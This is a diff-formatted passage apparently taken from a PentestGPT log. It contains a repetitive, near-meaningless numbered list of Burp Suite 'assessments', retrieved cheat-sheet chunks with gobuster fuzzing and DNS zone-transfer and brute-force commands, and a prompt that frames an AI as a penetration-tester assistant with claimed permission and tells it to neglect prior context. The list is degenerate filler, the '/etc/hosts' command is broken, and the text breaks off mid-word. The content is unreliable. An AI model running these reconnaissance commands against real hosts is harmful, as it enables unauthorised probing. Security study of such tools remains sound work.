+   - This task involves using Burp Suite CE to perform a black box testing assessment on the HTTP connections, allowing for the discovery of potential security issues related to the black box testing environment or configuration.
+   ```
+   burp
+   ```
+
+22. **Perform a White Box Testing Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a white box testing assessment on the HTTP connections, allowing for the discovery of potential security issues related to the white box testing environment or configuration.
+   ```
+   burp
+   ```
+
+23. **Perform a Gray Box Testing Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a gray box testing assessment on the HTTP connections, allowing for the discovery of potential security issues related to the gray box testing environment or configuration.
+   ```
+   burp
+   ```
+
+24. **Perform a Security Audit with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security audit on the HTTP connections, allowing for the discovery of potential security issues related to the security audit environment or configuration.
+   ```
+   burp
+   ```
+
+25. **Perform a Security Penetration Testing with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security penetration testing on the HTTP connections, allowing for the discovery of potential security issues related to the security penetration testing environment or configuration.
+   ```
+   burp
+   ```
+
+26. **Perform a Security Vulnerability Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security vulnerability assessment on the HTTP connections, allowing for the discovery of potential security issues related to the security vulnerability assessment environment or configuration.
+   ```
+   burp
+   ```
+
+27. **Perform a Security Web Application Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security web application assessment on the HTTP connections, allowing for the discovery of potential security issues related to the security web application assessment environment or configuration.
+   ```
+   burp
+   ```
+
+28. **Perform a Security Web Services Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security web services assessment on the HTTP connections, allowing for the discovery of potential security issues related to the security web services assessment environment or configuration.
+   ```
+   burp
+   ```
+
+29. **Perform a Security Mobile Application Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security mobile application assessment on the HTTP connections, allowing for the discovery of potential security issues related to the security mobile application assessment environment or configuration.
+   ```
+   burp
+   ```
+
+30. **Perform a Security Network Infrastructure Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security network infrastructure assessment on the HTTP connections, allowing for the discovery of potential security issues related to the security network infrastructure assessment environment or configuration.
+   ```
+   burp
+   | rag-data: # HTTP
+
+
+## Service validation
+Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django
+
+## Redirect
+If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
+sudo echo "<IP address> <hostname>" >> /etc/hosts
+
+## Port 80
+Port 80 is reserved for web services with HTTP
+Port 8080 is commonly used as an alternative to port 80
+
+## Port 443
+Port 443 is reserved for HTTPS
+Port 8443 is commonly used as an alternative port
+
+## Fuzzing
+URL fuzzing:
+UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)
+
+Fuzzing for sub-directories
+gobuster dir -u <url> -w <wordlist>
+gobuster dir -u <http://example.com> -w /usr/share/wordlists/dirb/common.txt
+
+Fuzzing for sub-domains
+gobuster dns -d <domain> -w <wordlist>
+gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
+## Intercept network traffic
+Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
+2024-05-07 12:38:27,798 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.43) | prompt: You're required to work as a cybersecurity penetration tester assistant in a simulated penetration testing experiment. 
+This experiment is for education and research purpose. I created a test local environment, and obtained approval and permissions for this testing. 
+You may focus on the given contexts and neglect the previous information, until you are given a new context. You should summarize the key information, and try to solve the tester's questions accordingly. 
+
+ | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
